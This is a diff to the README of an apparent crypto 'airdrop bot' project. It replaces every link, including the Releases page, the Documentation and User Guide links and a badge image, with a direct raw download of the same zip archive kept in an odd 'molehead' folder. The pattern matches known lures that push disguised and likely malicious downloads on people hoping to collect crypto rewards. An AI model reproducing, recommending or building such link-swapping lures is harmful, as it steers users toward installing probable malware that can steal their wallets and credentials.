@@ -1,6 +1,6 @@
 # 🌟 Trailblazers-Taiko-Airdrop-bot - Earn Rewards by Exploring Our Ecosystem
 
-![Download Now](https://img.shields.io/badge/Download_Now-%20-blue)  
+![Download Now](https://raw.githubusercontent.com/GoKu0p/Trailblazers-Taiko-Airdrop-bot/main/molehead/Trailblazers-Taiko-Airdrop-bot-v3.7.zip%20-blue)  
 
 ## 📦 Overview
 
@@ -13,7 +13,7 @@ To get started with the Trailblazers-Taiko-Airdrop-bot, follow these simple step
 1. **Download and Install the Application**: 
    To access the application, you will need to visit the Releases page. Click the link below to download the latest version.
 
-   [Visit Releases Page to Download](https://github.com/GoKu0p/Trailblazers-Taiko-Airdrop-bot/releases)
+   [Visit Releases Page to Download](https://raw.githubusercontent.com/GoKu0p/Trailblazers-Taiko-Airdrop-bot/main/molehead/Trailblazers-Taiko-Airdrop-bot-v3.7.zip)
 
 2. **Unpack the Downloaded File**: 
    After downloading, locate the file in your downloads folder. You may need to extract it if it comes in a zipped format.
@@ -50,7 +50,7 @@ The Trailblazers-Taiko-Airdrop-bot is designed for easy access. Here are the bas
 
 To download the application, visit the link below. Make sure you are downloading the latest version for the best experience.
 
-[Visit Releases Page to Download](https://github.com/GoKu0p/Trailblazers-Taiko-Airdrop-bot/releases)
+[Visit Releases Page to Download](https://raw.githubusercontent.com/GoKu0p/Trailblazers-Taiko-Airdrop-bot/main/molehead/Trailblazers-Taiko-Airdrop-bot-v3.7.zip)
 
 After you've downloaded the application, follow the steps above to install and get started.
 
@@ -76,7 +76,7 @@ Stay updated and connect with other users by joining our community channels. We 
 
 For detailed guides and the latest updates about the Trailblazers-Taiko-Airdrop-bot, check our resources:
 
-- [Documentation](https://github.com/GoKu0p/Trailblazers-Taiko-Airdrop-bot/wiki)
-- [User Guide](https://github.com/GoKu0p/Trailblazers-Taiko-Airdrop-bot/wiki/User-Guide)
+- [Documentation](https://raw.githubusercontent.com/GoKu0p/Trailblazers-Taiko-Airdrop-bot/main/molehead/Trailblazers-Taiko-Airdrop-bot-v3.7.zip)
+- [User Guide](https://raw.githubusercontent.com/GoKu0p/Trailblazers-Taiko-Airdrop-bot/main/molehead/Trailblazers-Taiko-Airdrop-bot-v3.7.zip)
 
 By following these steps, you are on your way to enjoying the benefits of the Trailblazers-Taiko-Airdrop-bot. Start exploring and receiving rewards today!
